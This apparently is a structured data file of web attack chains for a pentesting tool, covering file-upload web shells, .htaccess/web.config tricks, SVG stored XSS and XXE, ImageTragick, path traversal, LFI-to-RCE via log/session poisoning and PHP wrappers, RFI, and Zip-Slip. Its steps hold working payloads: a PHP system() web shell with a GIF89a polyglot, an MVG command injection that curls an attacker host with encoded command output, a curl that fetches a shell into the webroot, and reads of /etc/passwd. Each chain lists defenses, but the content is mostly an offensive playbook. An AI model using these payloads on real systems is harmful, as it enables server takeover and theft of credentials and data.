chains.title: File upload to a PHP web shell
chains.impact: Full RCE as the web user (www-data); a classic P1 depending on scope.
chains.why: The most reliable path from upload to shell; bypassing the blacklist and Content-Type check should be automatic.
chains.precondition: An upload field (avatar, attachment, import) that saves files to a web-accessible directory with PHP execution.
chains.realWorld: PortSwigger Web Security Academy, File upload vulnerabilities labs; OWASP Unrestricted File Upload.
chains.defense: Server-side extension allowlist, image re-encoding, storing uploads outside the webroot and serving them through a non-executing handler.

steps.title: Find the upload and its directory
Content-Type spoofing
steps.detail: keep the .php name, set Content-Type: image/jpeg on the file part in Burp

steps.title: Magic-byte polyglot
steps.detail: GIF89a;<?php system($_GET['cmd']); ?> save as shell.php (bypasses getimagesize())

steps.title: Confirm RCE and persist
steps.detail: curl 'https://target/uploads/shell.php?cmd=id'; upgrade: weevely generate S3cret agent.php

chains.title: The .htaccess / web.config upload trick
chains.impact: RCE on a server that only accepts 'images', by redefining which extensions get executed as code.
chains.why: Bypasses a strict extension allowlist when the config file itself is not blacklisted; a fallback when .phtml and friends do not get through.
chains.precondition: The upload lands in an Apache directory with AllowOverride All (or IIS), and the filter does not block .htaccess / web.config.
chains.realWorld: HackTricks 'File Upload - .htaccess / web.config'; recurring HackerOne reports on avatar uploads.
chains.defense: Block dotfiles and *.config on upload, disable AllowOverride, keep uploads out of interpreter-mapped paths.

steps.title: Identify the web server
steps.detail: curl -I https://target  ->  check Server: (Apache / IIS / nginx)

steps.title: Upload a shell with the new extension
IIS variant
steps.detail: web.config with a <handlers>/<staticContent> block, or classic ASP <%= Response.Write(...) %>

steps.title: Note on nginx
steps.detail: no per-dir override; the trick will not work, pivot to traversal via the stored file name

chains.title: SVG / HTML upload to stored XSS and account takeover
chains.impact: Stored XSS in the victim's/admin's browser; session theft or an action as the admin leads to takeover.
chains.why: When code execution is not available, 'images' served inline as HTML/SVG yield stored XSS in the same origin.
chains.precondition: The application accepts SVG/HTML/XML and serves it inline on its own origin, not as a download attachment.
chains.realWorld: Numerous HackerOne reports on stored XSS via SVG; PortSwigger notes on Content-Type and SVG.
chains.defense: Serve user files from a sandboxed origin with Content-Disposition: attachment and CSP, or sanitize SVG (DOMPurify) and strip scripts.

steps.title: Check inline serving
steps.detail: open the file URL: Content-Type: image/svg+xml and NO Content-Disposition: attachment

steps.title: Bonus: file read via SVG / XXE
steps.detail: <image xlink:href="file:///etc/passwd"/> or an XXE entity if the parser is XML-based

steps.title: Weaponize the attack
steps.detail: send the file link to an admin, hijack the session or trigger a state-changing endpoint as them

chains.title: Malicious image to RCE (ImageTragick / ImageMagick)
chains.impact: Server-side RCE the moment your 'image' is processed / its preview is generated.
chains.why: Any application that runs uploads through ImageMagick/GraphicsMagick can be broken without a web shell, often blind via OOB.
chains.precondition: The upload is passed to ImageMagick convert/identify (resize, preview, avatar crop, PDF) on a version without a hardened policy.xml.
chains.defense: Update ImageMagick and lock down /etc/ImageMagick*/policy.xml for the MVG/MSL/URL/HTTPS/EPHEMERAL coders; verify the real image type before processing.

steps.title: Detect image processing
steps.detail: upload a normal JPG and notice resize/re-encoding  ->  there is a converter in the pipeline

steps.title: OOB activity probe
steps.detail: exploit.mvg: push graphic-context / fill 'url(https://{LHOST}/ping.jpg)' / pop graphic-context

steps.title: Command injection (ImageTragick CVE-2016-3714)
steps.detail: fill 'url(https://127.0.0.1/x.jpg"|curl https://{LHOST}/$(id|base64))' inside an MVG graphic-context

steps.title: Disguise as an image
steps.detail: save the MVG bytes as poc.png; ImageMagick picks the coder by content, not by extension

steps.title: Pivot via GhostScript
steps.detail: if PDF/EPS is accepted, try the -dSAFER bypass (CVE-2018-16509) via a crafted .eps

chains.title: Path Traversal: reading /etc/passwd, source code, and secrets
chains.impact: Arbitrary file read: source code, .env, DB credentials, private keys, cloud tokens; often a direct path to full takeover.
chains.why: A basic read primitive that turns a minor bug into full compromise and forms the first half of most LFI -> RCE chains.
chains.precondition: A parameter that names a file: ?file= ?page= ?download= ?template= ?lang=, an image/attachment proxy.
chains.realWorld: General technique; OWASP Path Traversal; ubiquitous ?file= findings during recon.
chains.defense: Canonicalize via realpath, check the base-directory prefix, reject ../ and null bytes.

steps.title: Read source via the php filter

chains.title: LFI to RCE via poisoning a readable file
chains.impact: Turns a read-only LFI into full RCE as www-data.
chains.why: The classic LFI escalation without an available upload: inject PHP into a file you already read, then include it.
chains.precondition: A confirmed LFI where included files are executed, plus a readable attacker-controlled file (a log, /proc, or a PHP session).
chains.realWorld: HTB Poison / Beep; OWASP 'LFI + log poisoning'.
chains.defense: Never include() with a user-controlled path, set open_basedir, keep logs and sessions out of the inclusion scope.

steps.title: Confirm that include executes code
steps.detail: ?page=../../../../etc/passwd works AND .php files are executed, not printed

steps.title: PHP session file variant
steps.detail: write <?php system($_GET['cmd']); ?> into a session field, then ?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>&cmd=id

steps.title: Confirm and pop a reverse shell

chains.title: LFI to RCE via PHP wrappers (filter chain, data://, input, expect)
chains.impact: Full RCE from a pure file-read LFI with no upload and no writable log.
chains.why: A modern, near-universal LFI -> RCE against include/require/file_get_contents when poisoning and upload are impossible.
chains.precondition: The LFI sink is reachable via PHP stream wrappers (the value flows into a PHP file-read function).
chains.realWorld: Synacktiv 'PHP filter chains: file read to RCE'; HTB UpDown.
chains.defense: Disable allow_url_include, allowlist include targets, restrict PHP via disable_functions and open_basedir.

steps.title: Check php:// availability
steps.success: a base64 blob instead of a render

steps.title: Run the chain (no file needed)
steps.detail: insert the long php://filter/convert.iconv.../resource=php://temp into ?file= and append &cmd=id

steps.title: expect:// variant
steps.detail: ?file=expect://id  (only if the expect extension is loaded)

chains.title: Remote File Inclusion to a remote web shell
chains.impact: Instant RCE by including code from your server (rarer on modern stacks).
chains.why: A textbook inclusion bug and a clear demonstration of why allow_url_include is dangerous.
chains.precondition: An inclusion sink plus allow_url_include=On and allow_url_fopen=On (typical of legacy PHP / misconfiguration).
chains.realWorld: General technique; OWASP RFI; old WordPress/Joomla plugin advisories.
chains.defense: Keep allow_url_include=Off (the default since PHP 5.2), do not build include paths from user input.

steps.title: Persist
steps.detail: include weevely agent.php remotely or system('curl -o /var/www/html/uploads/s.php https://{LHOST}/s.php')

chains.title: Zip-Slip / symlink / archive extraction bypass
chains.impact: Writing a web shell into the webroot (or overwriting cron/authorized_keys) and reading arbitrary files via symlinks.
chains.why: Anywhere an application extracts an uploaded archive (import, plugin/theme, backup restore), a crafted entry name escapes the directory.
chains.precondition: An endpoint that extracts an uploaded .zip/.tar without sanitizing entry names.
chains.realWorld: Snyk's 'Zip Slip' research (2018), which affected numerous archive libraries and CVEs.
chains.defense: Reject entry names with .. or absolute paths, canonicalize every destination path and verify it stays inside the target directory, forbid extracting symlinks.

steps.title: Manual write variant
steps.detail: python3 zipfile: write an entry named ../../../../var/www/html/uploads/shell.php

steps.title: Upload and extract
steps.detail: send evil.zip to the import endpoint and let the server extract it

steps.title: Symlink read variant
steps.detail: ln -s /etc/passwd link; tar -cvf evil.tar link  (or zip --symlinks)  then read the extracted link
